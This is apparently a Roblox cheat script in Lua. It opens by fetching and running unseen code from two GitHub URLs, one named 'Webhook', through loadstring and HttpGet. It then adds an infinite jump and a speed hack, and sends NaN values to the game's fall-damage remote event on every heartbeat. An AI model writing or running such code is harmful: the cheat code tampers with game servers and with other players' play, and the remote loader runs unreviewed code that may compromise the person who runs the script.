if not _G.hasExecuted then
    _G.hasExecuted = true
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/refs/heads/main/Webhook"))()
end
if not _G.hasExecuted then
    _G.hasExecuted = true
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/refs/heads/main/Owner%20powers"))()
end

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local fall_dmg = player:FindFirstChild("RemoteEvent")
local nan = 0/0
local speed = 50

UserInputService.JumpRequest:Connect(function()
    local character = player.Character
    if character then
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end
end)

RunService.RenderStepped:Connect(function(deltaTime)
    local character = player.Character
    local humanoid = character and character:FindFirstChild("Humanoid")
    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
    
    if humanoid and humanoidRootPart then
        local moveDirection = humanoid.MoveDirection
        if moveDirection.Magnitude > 0 then
            humanoidRootPart.CFrame = humanoidRootPart.CFrame + (moveDirection * speed * deltaTime)
        end
    end
end)

if fall_dmg then
    RunService.Heartbeat:Connect(function()
        fall_dmg:FireServer("FallDamage", nan)
    end)
end
